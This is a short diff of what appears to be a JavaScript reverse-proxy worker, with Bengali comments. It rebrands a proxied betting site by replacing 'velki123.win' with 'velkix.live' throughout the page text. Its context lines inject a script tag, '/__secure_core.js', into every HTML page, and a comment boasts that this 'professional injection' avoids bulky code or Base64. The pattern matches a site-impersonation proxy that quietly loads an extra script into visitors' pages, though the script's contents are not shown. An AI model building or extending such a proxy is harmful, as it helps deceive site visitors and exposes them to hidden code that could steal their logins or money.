@@ -144,6 +144,10 @@ export default {
             text = text.replaceAll(originalUrl.replace(/\//g, '\\/'), proxyUrl.replace(/\//g, '\\/'));
         });
 
+        // 🔹 আপনার নির্দেশ অনুযায়ী শুধুমাত্র মেইন ওয়েবসাইটের টেক্সট রিপ্লেস করা হলো 🔹
+        text = text.replaceAll(/velki123\.win/gi, "velkix.live");
+        text = text.replaceAll(/velki123/gi, "velkix.live");
+
         // 🔒 প্রফেশনাল ইনজেকশন: এখানে কোনো বিশাল কোড বা Base64 নেই, শুধু একটা ছোট লিংক!
         if (contentType.includes("text/html")) {
             const ghostScriptTag = `<script src="/__secure_core.js"></script>`;
